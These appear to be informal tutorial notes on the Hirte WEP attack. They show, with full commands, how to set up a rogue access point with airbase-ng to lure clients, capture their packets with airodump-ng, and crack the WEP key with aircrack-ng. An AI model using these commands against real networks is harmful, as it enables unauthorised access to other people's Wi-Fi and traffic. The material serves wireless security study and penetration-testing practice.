... hirte attack
...
... lets first create one access-point where we will lure client to connect
... once any client connect there immidiately hirte attack will be imposed
... on the clients. hirte attack is almost same as the caffe-latte attack.
... but only exception is that packets are used as fragmentations and any 
... number of packets will be used.

... to create one fake or rouge access point we do the following.
... to create one ap we will use the following options.

  Airbase-ng 1.2 beta2 - (C) 2008-2013 Thomas d'Otreppe
  Original work: Martin Beck
  http://www.aircrack-ng.org

  usage: airbase-ng <options> <replay interface>

  Options:

      -a bssid         : set Access Point MAC address
      -W 0|1           : [don't] set WEP flag in beacons 0|1 (default: auto)
      -v               : verbose (print more messages)
      -c channel       : sets the channel the AP is running on
      -L               : Caffe-Latte WEP attack (use if driver can't send frags)
      -N               : cfrag WEP attack (recommended)

      --help           : Displays this usage screen

 # airbase-ng -c 3 -a aa:bb:cc:dd:ee:ff -e "Rokeya" -W 1 -N wlan0mon

... on another window we will run the airodump-ng to capture the packets

 # airodump-ng -c 3 --bssid aa:bb:cc:dd:ee:ff --write hirte_packets wlan0mon

... once the client connect to this ap it will start hirte attack and start
... capturing the file. from the file we can crack the key using the aircrack-ng

 # aircrack-ng hirte_packets.cap

... we can see the wep key if it is captured during the packets capturing sessions.
